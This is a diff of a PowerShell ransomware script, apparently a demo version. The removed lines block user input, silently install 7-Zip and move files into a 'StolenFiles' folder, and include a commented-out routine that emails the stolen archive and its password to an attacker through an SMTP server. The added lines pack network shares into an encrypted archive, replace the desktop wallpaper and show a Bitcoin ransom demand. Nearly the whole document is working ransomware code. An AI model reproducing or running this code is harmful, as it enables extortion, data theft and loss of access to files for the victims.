@@ -1,118 +1,102 @@
-#Temporarily disable user mouse and keyboard input
-$code = @"
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-"@
+#Start-Process powershell -Verb runAs
+#if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 
-$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
-$userInput::BlockInput($true)
-
-#Install 7zip to zip files
-$workdir = "c:\installer\"
-
-If (Test-Path -Path $workdir -PathType Container)
-{ Write-Host "$workdir already exists" -ForegroundColor Red}
-ELSE
-{ New-Item -Path $workdir  -ItemType directory }
-
-#Download the installer
-$source = "http://www.7-zip.org/a/7z1604-x64.msi"
-$destination = "$workdir\7-Zip.msi"
-
-
-if (Get-Command 'Invoke-Webrequest')
+$Source = "C:\Shares"
+$Destination = "C:\StolenFiles"
+for ($i = 1; $i -le 100; $i++ )
 {
-     Invoke-WebRequest $source -OutFile $destination
+    Write-Progress -Activity "Ransomwae Loading" -Status "$i% Complete:" -PercentComplete $i
+    Start-Sleep -Milliseconds 20
 }
-else
+for ($i = 1; $i -le 100; $i++ )
 {
-    $WebClient = New-Object System.Net.WebClient
-    $webclient.DownloadFile($source, $destination)
+    Write-Progress -Activity "Generating 128bit character password and indexing files" -Status "$i% Complete:" -PercentComplete $i
+    Start-Sleep -Milliseconds 20
 }
-
-Invoke-WebRequest $source -OutFile $destination 
-
-#Start the installation
-msiexec.exe /i "$workdir\7-Zip.msi" /qb
-
-#Wait a few Seconds for the installation to finish
-Start-Sleep -s 10
-
-#Remove the installer
-rm -Force $workdir\7*
-
-#Set source and destination of files to copy and store (ideally you would use something other than desktop)
-$Source = "C:\Users\(username)\Desktop\StealableFiles"
-$Destination = "C:\Users\(username)\Desktop\StolenFiles"
-
-#Copy all files with certain extension and delete them in the source location
-$cp = robocopy /mov $Source $Destination *.txt /s
-
-#Set the password to password
-[Reflection.Assembly]::LoadWithPartialName("System.Web")
-#The old cold generated a random password
-#$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
-$randomPassword = "password"
-
-#@@SC: Piping password out to C for demo purposes
-$randomPassword | Out-File -FilePath "c:\RansomeLockedPassword.txt" -Force
-
+for ($i = 1; $i -le 100; $i++ )
+{
+    Write-Progress -Activity "Encrypting all files and network shares" -Status "$i% Complete:" -PercentComplete $i
+    Start-Sleep -Milliseconds 70
+}
 #Set source for 7zip exe (usually the same path in most basic computers)
 $pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
 
 #Zip destination folder with the random password previously generated
-$arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
+$arguments = "a -t7z ""$Destination"" ""$Source"" -mhe=on -ppassword"
 $windowStyle = "Normal"
 $p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle
-
-#Delete the destination folder
-$del = Remove-Item $Destination -Force -Recurse
-
-<# @@SC: Commenting out email section
-$email = "(enter email address you want files sent to)"
-
-#Send password for files to your e-mail
-$SMTPServer = "smtp.example.net"
-$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
-$From = $email
-$To = $email
-$Subject = "$Destination Password $(get-date -f yyyy-MM-dd)"
-$Body =  $randomPassword
-$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
-$Msg.IsBodyHTML = $False
-$Mailer.send($Msg)
-$Msg.Dispose()
-$Mailer.Dispose()
-
-#Send zip folder to your e-mail
-$ZipFolder = "C:\Users\(username)\Desktop\StolenFiles.zip"
-$SMTPServer = "smtp.example.net"
-$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
-$From = $email
-$To = $email
-$Subject = "$Destination Content $(get-date -f yyyy-MM-dd)"
-$Body = "Zip Attached"
-$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
-$Msg.IsBodyHTML = $False
-$Attachment = new-object Net.Mail.Attachment($ZipFolder)
-$Msg.attachments.add($Attachment)
-$Mailer.send($Msg)
-$Attachment.Dispose()
-$Msg.Dispose()
-$Mailer.Dispose()
-#>
-#Delete the zip file created
-$del = Remove-Item $ZipFolder -Force -Recurse
-
-#Disable temporary user keyboard and mouse input block
-$userInput::BlockInput($false)
-
+#Start-Process C:\Program Files\7-Zip\7z.exe a  -psecret$randomPassword 
+#Start-Process $pathTo64Bit7Zip a -t7z C:\Users\Administrator\Desktop\StolenFiles C:\Shares
 #Display a message demanding money
 #Add the required .NET assembly for message display
 Add-Type -AssemblyName System.Windows.Forms
 
 #Set the background to ransomware
 #set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value accipiter.png
+#Change the background 
+Function Update-Wallpaper {
+    Param(
+        [Parameter(Mandatory=$true)]
+        $Path,
+         
+        [ValidateSet('Center','Stretch','Fill','Tile','Fit')]
+        $Style
+    )
+    Try {
+        if (-not ([System.Management.Automation.PSTypeName]'Wallpaper.Setter').Type) {
+            Add-Type -TypeDefinition @"
+            using System;
+            using System.Runtime.InteropServices;
+            using Microsoft.Win32;
+            namespace Wallpaper {
+                public enum Style : int {
+                    Center, Stretch, Fill, Fit, Tile
+                }
+                public class Setter {
+                    public const int SetDesktopWallpaper = 20;
+                    public const int UpdateIniFile = 0x01;
+                    public const int SendWinIniChange = 0x02;
+                    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+                    private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
+                    public static void SetWallpaper ( string path, Wallpaper.Style style ) {
+                        SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
+                        RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
+                        switch( style ) {
+                            case Style.Tile :
+                                key.SetValue(@"WallpaperStyle", "0") ; 
+                                key.SetValue(@"TileWallpaper", "1") ; 
+                                break;
+                            case Style.Center :
+                                key.SetValue(@"WallpaperStyle", "0") ; 
+                                key.SetValue(@"TileWallpaper", "0") ; 
+                                break;
+                            case Style.Stretch :
+                                key.SetValue(@"WallpaperStyle", "2") ; 
+                                key.SetValue(@"TileWallpaper", "0") ;
+                                break;
+                            case Style.Fill :
+                                key.SetValue(@"WallpaperStyle", "10") ; 
+                                key.SetValue(@"TileWallpaper", "0") ; 
+                                break;
+                            case Style.Fit :
+                                key.SetValue(@"WallpaperStyle", "6") ; 
+                                key.SetValue(@"TileWallpaper", "0") ; 
+                                break;
+}
+                        key.Close();
+                    }
+                }
+            }
+"@ -ErrorAction Stop 
+            } 
+        } 
+        Catch {
+            Write-Warning -Message "Wallpaper not changed because $($_.Exception.Message)"
+        }
+    [Wallpaper.Setter]::SetWallpaper( $Path, $Style )
+}
 
+Update-Wallpaper C:\Pictures\r.png Tile
 #Show the message
-$result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
+$result = [System.Windows.Forms.MessageBox]::Show('We have all of your important files!!! We demand £10,000,000 Bitcoins for their return.:) you have 48 hours. GO!', 'You are in trouble Sunshine', 'Ok', 'Warning')
+exit
